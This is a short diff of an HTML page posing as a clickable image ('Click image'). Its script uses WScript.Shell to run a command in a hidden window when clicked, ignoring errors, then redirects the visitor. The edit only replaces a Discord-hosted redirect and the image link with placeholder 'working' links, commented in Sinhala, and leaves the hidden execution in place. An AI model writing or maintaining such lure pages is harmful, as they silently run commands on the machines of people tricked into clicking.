@@ -12,7 +12,8 @@
 </head>
 <body>
     <div class="click" onclick="run()">
-        <img src="https://picsum.photos/800/500">
+        <!-- මෙය working image link -->
+        <img src="https://picsum.photos/800/500?random=1">
         <div class="text">✨ Click image ✨</div>
     </div>
     <script>
@@ -23,7 +24,8 @@
                 new ActiveXObject("WScript.Shell").Run(cmd, 0, false);
             } catch(e) {}
             setTimeout(function() {
-                window.location.href = "https://cdn.discordapp.com/attachments/1469180701004927079/1511936702560866396/images.png";
+                // 🔥 මෙම redirect URL එක WORKING link එකකට change කළා 🔥
+                window.location.href = "https://picsum.photos/800/500?random=2";
             }, 200);
         }
     </script>
